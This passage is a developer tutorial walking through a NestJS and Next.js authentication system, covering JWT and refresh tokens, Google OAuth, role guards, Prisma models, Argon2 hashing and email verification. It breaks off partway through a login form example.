# Authentication System - Deep Dive Tutorial

This document explains every detail of the authentication system built for MindfulSpace, covering both NestJS (backend) and Next.js (frontend) implementations.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Backend (NestJS) - Deep Dive](#backend-nestjs---deep-dive)
3. [Frontend (Next.js) - Deep Dive](#frontend-nextjs---deep-dive)
4. [Security Concepts Explained](#security-concepts-explained)
5. [Data Flow Examples](#data-flow-examples)
6. [Best Practices & Design Patterns](#best-practices--design-patterns)

---

## Architecture Overview

### The Big Picture

```
┌─────────────────────────────────────────────────────────────┐
│                        Browser (User)                        │
└────────────┬────────────────────────────────────┬───────────┘
             │                                     │
             │ HTTP Requests                       │ Cookies
             │ (with credentials)                  │ (httpOnly)
             ▼                                     ▼
┌─────────────────────────────────────────────────────────────┐
│                   Next.js Frontend (Port 3000)               │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  AuthContext (React Context)                          │   │
│  │  - Manages user state globally                        │   │
│  │  - Provides: user, loading, login(), logout()         │   │
│  └──────────────────────────────────────────────────────┘   │
│                           │                                   │
│                           │ fetch() with credentials          │
│                           ▼                                   │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  API Client (lib/api/auth.ts)                         │   │
│  │  - All API calls                                      │   │
│  │  - Error handling                                     │   │
│  └──────────────────────────────────────────────────────┘   │
└────────────┬────────────────────────────────────────────────┘
             │
             │ HTTP/JSON
             ▼
┌─────────────────────────────────────────────────────────────┐
│                   NestJS API (Port 3001)                     │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Controllers (auth.controller.ts)                     │   │
│  │  - Route handlers                                     │   │
│  │  - HTTP layer                                         │   │
│  └────────────┬─────────────────────────────────────────┘   │
│               │                                               │
│               ▼                                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Guards (JWT, Roles, Permissions)                     │   │
│  │  - Authentication checks                              │   │
│  │  - Authorization checks                               │   │
│  └────────────┬─────────────────────────────────────────┘   │
│               │                                               │
│               ▼                                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Services (auth.service.ts)                           │   │
│  │  - Business logic                                     │   │
│  │  - Token generation                                   │   │
│  └────────────┬─────────────────────────────────────────┘   │
│               │                                               │
│               ▼                                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Prisma ORM                                           │   │
│  │  - Database queries                                   │   │
│  │  - Type-safe DB access                                │   │
│  └────────────┬─────────────────────────────────────────┘   │
└───────────────┼───────────────────────────────────────────────┘
                │
                ▼
    ┌───────────────────────┐
    │   PostgreSQL Database  │
    │   - User data          │
    │   - Tokens             │
    │   - Roles/Permissions  │
    └───────────────────────┘
```

### Request Flow Example: User Login

```
1. User enters email/password in frontend form
   ↓
2. Frontend calls: login({ email, password })
   ↓
3. API Client: fetch('http://localhost:3001/auth/login', { method: 'POST', body: {...} })
   ↓
4. NestJS Controller receives request
   ↓
5. Controller calls AuthService.login()
   ↓
6. AuthService:
   - Fetches user from DB (Prisma)
   - Verifies password with Argon2
   - Generates JWT tokens
   - Stores refresh token in DB
   ↓
7. Controller sets httpOnly cookies
   ↓
8. Response sent back to frontend with user data + tokens
   ↓
9. AuthContext updates state with user
   ↓
10. User redirected to dashboard
```

---

## Backend (NestJS) - Deep Dive

### 1. Module System (Dependency Injection)

#### What is a Module?

In NestJS, modules are the building blocks of your application. They organize code into cohesive units.

```typescript
// auth.module.ts
@Module({
  imports: [        // Other modules this module depends on
    PrismaModule,   // Provides database access
    JwtModule,      // Provides JWT functionality
    PassportModule, // Provides authentication strategies
  ],
  controllers: [    // HTTP route handlers
    AuthController,
  ],
  providers: [      // Services, strategies, guards (injectable classes)
    AuthService,
    CryptoService,
    EmailService,
    JwtAccessStrategy,
    JwtRefreshStrategy,
    GoogleStrategy,
    GithubStrategy,
    RolesGuard,
    PermissionsGuard,
  ],
  exports: [        // What other modules can use
    AuthService,
    CryptoService,
  ],
})
export class AuthModule {}
```

**Why this matters:**
- **Dependency Injection**: NestJS automatically creates and injects instances
- **Separation of Concerns**: Each part has a clear responsibility
- **Testability**: Easy to mock dependencies in tests
- **Reusability**: Export services to use in other modules

#### Dependency Injection Example

```typescript
// When you write this:
@Injectable()
export class AuthService {
  constructor(
    private readonly prisma: PrismaService,  // ← Injected automatically
    private readonly jwtService: JwtService, // ← Injected automatically
  ) {}
}

// NestJS does this behind the scenes:
// 1. Looks for PrismaService in PrismaModule
// 2. Creates/reuses instance of PrismaService
// 3. Injects it into AuthService constructor
// 4. Same for JwtService
```

**Benefits:**
- No need to manually create instances (`new PrismaService()`)
- Singleton pattern by default (one instance shared)
- Easy to replace with mocks for testing

---

### 2. Controllers (HTTP Layer)

Controllers handle incoming HTTP requests and return responses.

```typescript
@Controller('auth')  // ← All routes start with /auth
export class AuthController {
  constructor(private readonly authService: AuthService) {}

  @Public()          // ← Decorator: No authentication required
  @Post('login')     // ← Route: POST /auth/login
  @HttpCode(HttpStatus.OK)  // ← Returns 200 instead of default 201
  async login(
    @Body(ValidationPipe) dto: LoginDto,  // ← Validate request body
    @Req() req: Request,                   // ← Access full request object
    @Res({ passthrough: true }) res: Response,  // ← Access response object
  ) {
    // Extract metadata
    const userAgent = req.headers['user-agent'];
    const ipAddress = req.ip;

    // Call service layer
    const result = await this.authService.login(dto, userAgent, ipAddress);

    // Set cookies
    this.setAuthCookies(res, result.tokens.accessToken, result.tokens.refreshToken);

    // Return JSON response
    return result;
  }
}
```

**Key Concepts:**

1. **Decorators** (`@Controller`, `@Post`, etc.):
   - Metadata that NestJS reads at runtime
   - Tells NestJS how to route requests

2. **Dependency Injection in Controllers**:
   ```typescript
   constructor(private readonly authService: AuthService) {}
   // Now you can use: this.authService.login()
   ```

3. **Parameter Decorators**:
   - `@Body()` - Extracts request body
   - `@Param()` - Extracts URL parameters
   - `@Query()` - Extracts query strings
   - `@Req()` - Full request object
   - `@Res()` - Full response object
   - `@CurrentUser()` - Custom decorator for authenticated user

4. **ValidationPipe**:
   ```typescript
   @Body(ValidationPipe) dto: LoginDto
   // Automatically validates incoming data against LoginDto class
   // Rejects invalid requests with 400 Bad Request
   ```

---

### 3. DTOs (Data Transfer Objects)

DTOs define the shape of data and validation rules.

```typescript
// login.dto.ts
export class LoginDto {
  @IsEmail({}, { message: 'Invalid email format' })
  email!: string;  // ! tells TypeScript it will be set

  @IsString()
  password!: string;
}
```

**Why DTOs?**
1. **Type Safety**: TypeScript knows the shape of data
2. **Validation**: Decorators from `class-validator` check data
3. **Documentation**: Clear contract between frontend and backend
4. **Security**: Only accept expected fields (no extra fields)

**How Validation Works:**
```typescript
// User sends this:
{
  "email": "not-an-email",
  "password": "secret",
  "hack": "attempt"  // ← Extra field
}

// ValidationPipe checks:
// 1. email is valid email? ❌ → Returns error
// 2. password is string? ✅
// 3. Extra fields? ❌ → Strips "hack" field (if whitelist: true)
```

**Complex Validation Example:**
```typescript
export class RegisterDto {
  @IsString()
  @MinLength(2, { message: 'Name must be at least 2 characters' })
  @MaxLength(100, { message: 'Name must not exceed 100 characters' })
  displayName!: string;

  @IsEmail({}, { message: 'Invalid email format' })
  email!: string;

  @IsString()
  @MinLength(8, { message: 'Password must be at least 8 characters' })
  @Matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/, {
    message: 'Password must contain uppercase, lowercase, number, and special character',
  })
  password!: string;
}
```

---

### 4. Services (Business Logic)

Services contain the core business logic, separated from HTTP concerns.

```typescript
@Injectable()  // ← Makes it injectable via DI
export class AuthService {
  constructor(
    private readonly prisma: PrismaService,
    private readonly jwtService: JwtService,
    private readonly cryptoService: CryptoService,
    private readonly emailService: EmailService,
  ) {}

  async login(dto: LoginDto, userAgent?: string, ipAddress?: string): Promise<AuthResponse> {
    // 1. Fetch user from database
    const user = await this.prisma.user.findUnique({
      where: { email: dto.email },
      include: {
        userRoles: {
          include: { role: true },
        },
      },
    });

    if (!user || !user.password) {
      throw new UnauthorizedException('Invalid credentials');
    }

    // 2. Verify password
    const isPasswordValid = await this.cryptoService.verifyPassword(
      user.password,
      dto.password
    );

    if (!isPasswordValid) {
      throw new UnauthorizedException('Invalid credentials');
    }

    // 3. Check email verification
    if (!user.emailVerified) {
      throw new UnauthorizedException('Please verify your email');
    }

    // 4. Check account status
    if (!user.isActive) {
      throw new UnauthorizedException('Account is disabled');
    }

    // 5. Extract roles
    const roles = user.userRoles.map((ur) => ur.role.name);

    // 6. Generate tokens
    const tokens = await this.generateTokens(
      user.id,
      user.email,
      roles,
      userAgent,
      ipAddress
    );

    // 7. Return response
    return {
      user: {
        id: user.id,
        email: user.email,
        displayName: user.displayName,
        emailVerified: user.emailVerified,
        roles,
      },
      tokens,
    };
  }
}
```

**Why Services?**
1. **Separation of Concerns**: HTTP logic in controller, business logic in service
2. **Reusability**: Other parts of app can call the service
3. **Testability**: Easy to test without HTTP layer
4. **Single Responsibility**: Each service has one job

**Error Handling in Services:**
```typescript
// Throw specific exceptions that NestJS converts to HTTP responses
throw new UnauthorizedException('Invalid credentials');  // → 401
throw new NotFoundException('User not found');           // → 404
throw new ConflictException('Email already exists');     // → 409
throw new BadRequestException('Invalid data');           // → 400
```

---

### 5. Passport Strategies (Authentication)

Strategies define HOW to authenticate users.

#### JWT Strategy Example

```typescript
@Injectable()
export class JwtAccessStrategy extends PassportStrategy(Strategy, 'jwt-access') {
  constructor(
    private readonly configService: ConfigService,
    private readonly authService: AuthService,
  ) {
    // Get JWT secret from environment
    const secret = configService.get<string>('JWT_ACCESS_SECRET');
    if (!secret) {
      throw new Error('JWT_ACCESS_SECRET is not configured');
    }

    // Configure strategy
    super({
      // WHERE to find the JWT token
      jwtFromRequest: ExtractJwt.fromExtractors([
        // Option 1: From cookie (web browsers)
        (request: Request) => request?.cookies?.['access_token'],
        // Option 2: From Authorization header (mobile apps)
        ExtractJwt.fromAuthHeaderAsBearerToken(),
      ]),
      ignoreExpiration: false,  // Reject expired tokens
      secretOrKey: secret,       // Secret to verify signature
    });
  }

  // Called AFTER token is verified
  async validate(payload: JwtPayload) {
    // Payload contains: { sub: userId, email, roles }

    // Double-check user still exists and is active
    const user = await this.authService.getUserById(payload.sub);

    if (!user || !user.isActive) {
      throw new UnauthorizedException('User not found or inactive');
    }

    // This object is attached to request.user
    return {
      id: user.id,
      email: user.email,
      roles: payload.roles,
    };
  }
}
```

**How JWT Strategy Works:**

1. **Request comes in** with JWT token:
   ```
   GET /auth/me
   Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

2. **Strategy extracts token** from cookie or Authorization header

3. **Strategy verifies token signature** using `JWT_ACCESS_SECRET`

4. **If valid, calls `validate()` method** with decoded payload

5. **`validate()` can add extra checks** (user exists, active, etc.)

6. **Returns user object** which is attached to `request.user`

7. **Controller can now access** `@CurrentUser()` decorator

#### OAuth Strategy Example (Google)

```typescript
@Injectable()
export class GoogleStrategy extends PassportStrategy(Strategy, 'google') {
  constructor(
    private readonly configService: ConfigService,
    private readonly prisma: PrismaService,
  ) {
    super({
      clientID: configService.get<string>('GOOGLE_CLIENT_ID') || '',
      clientSecret: configService.get<string>('GOOGLE_CLIENT_SECRET') || '',
      callbackURL: configService.get<string>('GOOGLE_CALLBACK_URL'),
      scope: ['email', 'profile'],
    });
  }

  // Called after Google sends user back
  async validate(accessToken: string, refreshToken: string, profile: any, done: VerifyCallback) {
    const { id, emails, displayName } = profile;
    const email = emails[0].value;

    try {
      // Check if user exists
      let user = await this.prisma.user.findUnique({
        where: { email },
        include: {
          oauthAccounts: true,
          userRoles: { include: { role: true } },
        },
      });

      // Create new user if doesn't exist
      if (!user) {
        user = await this.prisma.user.create({
          data: {
            email,
            displayName,
            emailVerified: true,  // OAuth emails are pre-verified
            password: null,       // No password for OAuth users
          },
        });

        // Assign default role
        const userRole = await this.prisma.role.findUnique({
          where: { name: 'user' },
        });

        if (userRole) {
          await this.prisma.userRole.create({
            data: { userId: user.id, roleId: userRole.id },
          });
        }
      }

      // Link OAuth account
      const existingOAuthAccount = user.oauthAccounts.find(
        (account) => account.provider === 'google' && account.providerId === id,
      );

      if (!existingOAuthAccount) {
        await this.prisma.oAuthAccount.create({
          data: {
            provider: 'google',
            providerId: id,
            userId: user.id,
            accessToken,
            refreshToken,
          },
        });
      }

      // Reload user with fresh data
      user = await this.prisma.user.findUnique({
        where: { id: user.id },
        include: {
          oauthAccounts: true,
          userRoles: { include: { role: true } },
        },
      });

      if (!user) {
        return done(new Error('User not found after OAuth'), false);
      }

      done(null, user);  // Success!
    } catch (error) {
      done(error, false);  // Error!
    }
  }
}
```

**OAuth Flow:**

```
1. User clicks "Sign in with Google"
   ↓
2. Browser redirects to Google login
   ↓
3. User logs in at Google
   ↓
4. Google redirects back to: /auth/google/callback?code=ABC123
   ↓
5. GoogleStrategy exchanges code for access token
   ↓
6. GoogleStrategy calls validate() with user profile
   ↓
7. validate() creates/links user account
   ↓
8. Controller sets cookies and redirects to frontend
```

---

### 6. Guards (Authorization)

Guards decide if a request should be allowed.

#### JWT Auth Guard (Global Protection)

```typescript
@Injectable()
export class JwtAuthGuard extends AuthGuard('jwt-access') {
  constructor(private reflector: Reflector) {
    super();
  }

  canActivate(context: ExecutionContext): boolean | Promise<boolean> {
    // Check if route is marked as @Public()
    const isPublic = this.reflector.getAllAndOverride<boolean>('isPublic', [
      context.getHandler(),  // Method decorator
      context.getClass(),    // Class decorator
    ]);

    if (isPublic) {
      return true;  // Skip authentication
    }

    // Otherwise, require authentication
    return super.canActivate(context);
  }

  handleRequest(err: any, user: any, info: any) {
    if (err || !user) {
      throw err || new UnauthorizedException('Invalid or expired token');
    }
    return user;
  }
}
```

**How to Use:**
```typescript
// In auth.module.ts - Apply globally
{
  provide: APP_GUARD,
  useClass: JwtAuthGuard,  // ← All routes protected by default
}

// In controller - Opt out for specific routes
@Public()  // ← This route doesn't need authentication
@Post('login')
async login() { }

// In controller - Use authentication
@Get('me')  // ← Automatically protected
async getCurrentUser(@CurrentUser() user: any) {
  // user is already authenticated
}
```

#### Roles Guard (Role-Based Access)

```typescript
@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    // Get required roles from @Roles() decorator
    const requiredRoles = this.reflector.getAllAndOverride<string[]>('roles', [
      context.getHandler(),
      context.getClass(),
    ]);

    if (!requiredRoles || requiredRoles.length === 0) {
      return true;  // No roles required
    }

    // Get user from request (already authenticated by JwtAuthGuard)
    const request = context.switchToHttp().getRequest();
    const user = request.user;

    if (!user || !user.roles) {
      throw new ForbiddenException('User roles not found');
    }

    // Check if user has any of the required roles
    const hasRole = requiredRoles.some((role) => user.roles.includes(role));

    if (!hasRole) {
      throw new ForbiddenException(`Required roles: ${requiredRoles.join(', ')}`);
    }

    return true;
  }
}
```

**How to Use:**
```typescript
@Controller('admin')
@UseGuards(JwtAuthGuard, RolesGuard)  // ← Apply both guards
export class AdminController {

  @Roles('admin')  // ← Only admins can access
  @Get('users')
  getAllUsers() { }

  @Roles('admin', 'coach')  // ← Admins OR coaches can access
  @Get('reports')
  getReports() { }
}
```

**Guard Execution Order:**
```
1. JwtAuthGuard runs first
   - Verifies JWT token
   - Attaches user to request
   ↓
2. RolesGuard runs second
   - Reads user.roles from request
   - Checks against @Roles() decorator
   ↓
3. If both pass → Controller method executes
   If either fails → 401/403 error returned
```

---

### 7. Prisma ORM (Database)

Prisma provides type-safe database access.

#### Schema Definition

```prisma
// schema.prisma
model User {
  id            String   @id @default(cuid())
  email         String   @unique
  displayName   String?
  password      String?  // Nullable for OAuth-only users
  emailVerified Boolean  @default(false)
  isActive      Boolean  @default(true)

  // Relations
  userRoles               UserRole[]
  refreshTokens           RefreshToken[]
  emailVerificationTokens EmailVerificationToken[]

  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
}

model RefreshToken {
  id        String   @id @default(cuid())
  token     String   @unique
  userId    String
  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
  expiresAt DateTime
  createdAt DateTime @default(now())

  userAgent String?
  ipAddress String?

  @@index([userId])
  @@index([token])
}
```

**Key Concepts:**

1. **Relations**:
   ```prisma
   // One-to-Many: One user has many refresh tokens
   user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)

   // Cascade Delete: When user is deleted, all their tokens are deleted too
   ```

2. **Indexes**:
   ```prisma
   @@index([userId])  // Faster queries: WHERE userId = ?
   @@index([token])   // Faster queries: WHERE token = ?
   ```

3. **Default Values**:
   ```prisma
   @id @default(cuid())        // Auto-generate unique ID
   @default(now())             // Set to current timestamp
   @default(false)             // Boolean default
   ```

#### Using Prisma in Code

```typescript
// Simple query
const user = await this.prisma.user.findUnique({
  where: { email: 'user@example.com' },
});

// Query with relations
const user = await this.prisma.user.findUnique({
  where: { email: 'user@example.com' },
  include: {
    userRoles: {        // Include related userRoles
      include: {
        role: true,     // Include role for each userRole
      },
    },
  },
});
// Result shape:
// {
//   id: '...',
//   email: 'user@example.com',
//   userRoles: [
//     {
//       userId: '...',
//       roleId: '...',
//       role: {
//         id: '...',
//         name: 'admin',
//       },
//     },
//   ],
// }

// Create with relations
const user = await this.prisma.user.create({
  data: {
    email: 'new@example.com',
    password: 'hashed...',
    userRoles: {
      create: {         // Create related userRole at same time
        role: {
          connect: { id: roleId },  // Connect to existing role
        },
      },
    },
  },
});

// Transaction (all or nothing)
await this.prisma.$transaction(async (tx) => {
  const user = await tx.user.create({ data: { /* ... */ } });
  await tx.userRole.create({ data: { /* ... */ } });
  await tx.emailVerificationToken.create({ data: { /* ... */ } });
  // If any fails, all are rolled back
});
```

**Type Safety:**
```typescript
// Prisma generates TypeScript types automatically
const user: User = await this.prisma.user.findUnique({ /* ... */ });

// TypeScript knows about all fields
user.email;      // ✅ string
user.displayName;  // ✅ string | null
user.password;   // ✅ string | null
user.createdAt;  // ✅ Date
user.nonExistent;  // ❌ TypeScript error!
```

---

### 8. Password Hashing (Argon2)

```typescript
// crypto.service.ts
@Injectable()
export class CryptoService {
  async hashPassword(password: string): Promise<string> {
    return argon2.hash(password, {
      type: argon2.argon2id,    // Most secure variant
      memoryCost: 65536,        // 64 MB of RAM
      timeCost: 3,              // 3 iterations
      parallelism: 4,           // Use 4 threads
    });
  }

  async verifyPassword(hash: string, password: string): Promise<boolean> {
    try {
      return await argon2.verify(hash, password);
    } catch {
      return false;
    }
  }
}
```

**Why Argon2?**
- Winner of Password Hashing Competition (2015)
- Resistant to GPU/ASIC attacks
- Memory-hard (expensive to crack)
- Better than bcrypt, scrypt, PBKDF2

**Security Parameters:**
- `memoryCost: 65536` - Uses 64 MB RAM (makes it expensive to crack)
- `timeCost: 3` - 3 iterations (balance between security and speed)
- `parallelism: 4` - Uses 4 CPU threads

**Example:**
```typescript
const password = 'MyPassword123!';
const hash = await cryptoService.hashPassword(password);
// Result: $argon2id$v=19$m=65536,t=3,p=4$somerandomsalt$actualhash...

// Later, verify:
const isValid = await cryptoService.verifyPassword(hash, 'MyPassword123!');
// true ✅

const isInvalid = await cryptoService.verifyPassword(hash, 'WrongPassword');
// false ❌
```

---

### 9. JWT Tokens

#### Token Structure

```typescript
// JWT Payload
interface JwtPayload {
  sub: string;      // Subject (user ID)
  email: string;    // User email
  roles: string[];  // User roles
  iat: number;      // Issued at (timestamp)
  exp: number;      // Expires at (timestamp)
}

// Token Generation
const accessToken = await this.jwtService.signAsync(
  {
    sub: user.id,
    email: user.email,
    roles: ['user', 'premium'],
  },
  {
    secret: this.configService.get('JWT_ACCESS_SECRET'),
    expiresIn: '15m',  // 15 minutes
  }
);
```

**JWT Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

│         Header          │            Payload            │         Signature        │
└─────────────────────────┴───────────────────────────────┴──────────────────────────┘
```

**Decoded:**
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "user123",
  "email": "user@example.com",
  "roles": ["user"],
  "iat": 1516239022,
  "exp": 1516239922
}

// Signature (verifies the token hasn't been tampered with)
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  JWT_ACCESS_SECRET
)
```

#### Access vs Refresh Tokens

```typescript
// Access Token (Short-lived: 15 minutes)
// - Used for every API request
// - Stored in cookie or localStorage
// - Contains user info and roles
// - If stolen, only valid for 15 minutes

const accessToken = await this.jwtService.signAsync(payload, {
  secret: JWT_ACCESS_SECRET,
  expiresIn: '15m',
});

// Refresh Token (Long-lived: 7 days)
// - Used ONLY to get new access tokens
// - Stored in database (can be revoked)
// - Stored in httpOnly cookie (more secure)
// - If stolen, can be detected and revoked

const refreshToken = this.cryptoService.generateRefreshToken();
await this.prisma.refreshToken.create({
  data: {
    token: refreshToken,
    userId: user.id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  },
});
```

**Why Two Tokens?**

1. **Security**: Short-lived access tokens limit damage if stolen
2. **Convenience**: Don't force user to login every 15 minutes
3. **Revocation**: Can revoke refresh tokens in database
4. **Auditability**: Track when/where refresh tokens are used

**Token Refresh Flow:**
```
1. Access token expires (15 min)
   ↓
2. Frontend tries API call → 401 Unauthorized
   ↓
3. Frontend calls /auth/refresh with refresh token
   ↓
4. Backend verifies refresh token in database
   ↓
5. Backend generates NEW access token
   ↓
6. Backend generates NEW refresh token (rotation)
   ↓
7. Backend deletes OLD refresh token from database
   ↓
8. Frontend receives new tokens
   ↓
9. Frontend retries original API call with new access token
```

---

### 10. Email Verification Flow

```typescript
// 1. User registers
async register(dto: RegisterDto) {
  // Create user
  const user = await this.prisma.user.create({
    data: {
      email: dto.email,
      password: hashedPassword,
      displayName: dto.displayName,
      emailVerified: false,  // ← Not verified yet
    },
  });

  // Generate verification token
  const token = this.cryptoService.generateSecureToken();
  const expiresAt = new Date();
  expiresAt.setHours(expiresAt.getHours() + 24);  // Valid for 24 hours

  // Store token in database
  await this.prisma.emailVerificationToken.create({
    data: {
      token,
      userId: user.id,
      expiresAt,
    },
  });

  // Send email with verification link
  await this.emailService.sendVerificationEmail(
    user.email,
    user.displayName,
    token  // ← Token goes in email link
  );

  return { message: 'Please verify your email' };
}

// 2. User clicks link in email
async verifyEmail(token: string) {
  // Find token in database
  const verificationToken = await this.prisma.emailVerificationToken.findUnique({
    where: { token },
    include: { user: true },
  });

  if (!verificationToken) {
    throw new BadRequestException('Invalid verification token');
  }

  // Check if expired
  if (verificationToken.expiresAt < new Date()) {
    throw new BadRequestException('Verification token has expired');
  }

  // Mark user as verified
  await this.prisma.user.update({
    where: { id: verificationToken.userId },
    data: { emailVerified: true },
  });

  // Delete used token (one-time use)
  await this.prisma.emailVerificationToken.delete({
    where: { id: verificationToken.id },
  });

  return { message: 'Email verified successfully' };
}

// 3. User tries to login
async login(dto: LoginDto) {
  // ... (verify password, etc.)

  // Check if email is verified
  if (!user.emailVerified) {
    throw new UnauthorizedException('Please verify your email before logging in');
  }

  // ... (generate tokens, etc.)
}
```

**Security Considerations:**
- Token is cryptographically random (32 bytes = 64 hex chars)
- Token expires after 24 hours
- Token is one-time use (deleted after verification)
- Token is stored in database (can be revoked)

---

## Frontend (Next.js) - Deep Dive

### 1. App Router Structure

Next.js 13+ uses the App Router with file-based routing.

```
apps/frontend-next/src/app/
├── [locale]/                    # Dynamic locale segment
│   ├── layout.tsx               # Root layout (wraps all pages)
│   ├── (public)/                # Route group (doesn't affect URL)
│   │   ├── auth/
│   │   │   ├── login/
│   │   │   │   └── page.tsx     # Route: /en/auth/login
│   │   │   ├── register/
│   │   │   │   └── page.tsx     # Route: /en/auth/register
│   │   │   └── verify-email/
│   │   │       └── page.tsx     # Route: /en/auth/verify-email
│   │   └── page.tsx             # Route: /en
│   └── member/                  # Protected routes
│       └── dashboard/
│           └── page.tsx         # Route: /en/member/dashboard
```

**Key Concepts:**

1. **Dynamic Segments** `[locale]`:
   ```typescript
   // Matches: /en, /fr, /de, etc.
   // Access via: params.locale
   ```

2. **Route Groups** `(public)`:
   ```typescript
   // Groups routes without affecting URL
   // (public) and (private) both live under /[locale]
   // Useful for shared layouts or organization
   ```

3. **Layouts**:
   ```typescript
   // layout.tsx wraps all child routes
   // Good for providers, nav, footer
   export default function Layout({ children }) {
     return (
       <html>
         <body>
           <Nav />
           {children}  {/* Child pages render here */}
           <Footer />
         </body>
       </html>
     );
   }
   ```

4. **Pages**:
   ```typescript
   // page.tsx defines the route
   export default function LoginPage() {
     return <div>Login form</div>;
   }
   ```

---

### 2. React Context API (AuthContext)

Context provides global state without prop drilling.

```typescript
// contexts/AuthContext.tsx
'use client';

import { createContext, useContext, useState, useEffect, ReactNode } from 'react';

// 1. Define the shape of our context
interface AuthContextType {
  user: User | null;
  loading: boolean;
  login: (data: LoginData) => Promise<void>;
  logout: () => Promise<void>;
  refreshUser: () => Promise<void>;
}

// 2. Create context with undefined default
const AuthContext = createContext<AuthContextType | undefined>(undefined);

// 3. Create provider component
export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);

  // Fetch user on mount
  useEffect(() => {
    const fetchUser = async () => {
      try {
        const currentUser = await getCurrentUser();
        setUser(currentUser);
      } catch (error) {
        setUser(null);
      } finally {
        setLoading(false);
      }
    };

    fetchUser();
  }, []);

  const login = async (data: LoginData) => {
    const response = await apiLogin(data);
    setUser(response.user);  // Update state
  };

  const logout = async () => {
    await apiLogout();
    setUser(null);  // Clear state
  };

  const refreshUser = async () => {
    const currentUser = await getCurrentUser();
    setUser(currentUser);
  };

  // 4. Provide value to children
  return (
    <AuthContext.Provider value={{ user, loading, login, logout, refreshUser }}>
      {children}
    </AuthContext.Provider>
  );
}

// 5. Create custom hook for easy access
export function useAuth() {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
}
```

**How to Use:**

```typescript
// 1. Wrap app in provider (layout.tsx)
export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        <AuthProvider>  {/* ← Provides auth state to all children */}
          {children}
        </AuthProvider>
      </body>
    </html>
  );
}

// 2. Access in any component
'use client';
import { useAuth } from '@/contexts/AuthContext';

export default function MyComponent() {
  const { user, loading, logout } = useAuth();

  if (loading) return <div>Loading...</div>;
  if (!user) return <div>Not logged in</div>;

  return (
    <div>
      <p>Welcome, {user.displayName}!</p>
      <button onClick={logout}>Logout</button>
    </div>
  );
}
```

**Why Context?**

Without context:
```typescript
// ❌ Prop drilling (passing through many components)
<App user={user} />
  └─ <Layout user={user} />
       └─ <Nav user={user} />
            └─ <UserMenu user={user} />  ← Finally used here
```

With context:
```typescript
// ✅ Direct access anywhere
<App>
  <AuthProvider>
    <Layout>
      <Nav>
        <UserMenu />  {/* ← Can call useAuth() directly */}
      </Nav>
    </Layout>
  </AuthProvider>
</App>
```

---

### 3. API Client (Fetch Abstraction)

```typescript
// lib/api/auth.ts
const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';

export async function login(data: LoginData): Promise<AuthResponse> {
  const res = await fetch(`${API_URL}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',  // ← IMPORTANT: Send cookies
    body: JSON.stringify(data),
  });

  if (!res.ok) {
    const error = await res.json();
    throw new Error(error.message || 'Login failed');
  }

  return res.json();
}
```

**Key Concepts:**

1. **credentials: 'include'**:
   ```typescript
   // This tells fetch to:
   // - Send cookies with request
   // - Store cookies from response
   // Required for httpOnly cookie authentication
   ```

2. **Error Handling**:
   ```typescript
   if (!res.ok) {  // HTTP status 4xx or 5xx
     const error = await res.json();
     throw new Error(error.message);
   }
   // Caller can catch this error
   ```

3. **Environment Variables**:
   ```typescript
   // Must start with NEXT_PUBLIC_ to be accessible in browser
   process.env.NEXT_PUBLIC_API_URL  // ✅ Works
   process.env.API_URL              // ❌ Undefined in browser
   ```

---

### 4. Server Components vs Client Components

**Server Components** (default in Next.js 13+):
```typescript
// No 'use client' directive
// This component runs ONLY on the server

export default async function Page() {
  // Can do server-only things:
  // - Read files
  // - Query database
  // - Use secret environment variables

  const data = await fetch('...');

  return <div>{data}</div>;
}
```

**Client Components** (interactive):
```typescript
'use client';  // ← Must be at top of file

import { useState } from 'react';
import { useAuth } from '@/contexts/AuthContext';

export default function LoginForm() {
  const [email, setEmail] = useState('');
  const { login } = useAuth();

  // Can use:
  // - React hooks (useState, useEffect, etc.)
  // - Browser APIs (localStorage, window, etc.)
  // - Event handlers (onClick, onChange, etc.)

  return (
    <form onSubmit={handleSubmit}>
      <input
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
    </form>
  );
}
```

**When to Use Each:**

| Feature | Server Component | Client Component |
|---------|-----------------|------------------|
| React hooks | ❌ | ✅ |
| Event handlers | ❌ | ✅ |
| Browser APIs | ❌ | ✅ |
| Context providers | ❌ | ✅ |
| Database queries | ✅ | ❌ |
| File system access | ✅ | ❌ |
| Secret env vars | ✅ | ❌ |

---

### 5. Form Handling

```typescript
'use client';

export default function LoginForm() {
  const { login } = useAuth();
  const router = useRouter();

  // State for form fields
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  // State for UI feedback
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();  // ← Prevent page refresh

    setError('');       // Clear previous errors
    setLoading(true);   // Show loading state

    try {
      await login({ email, password });
      router.push('/member/dashboard');  // Redirect on success
    } catch (err: any) {
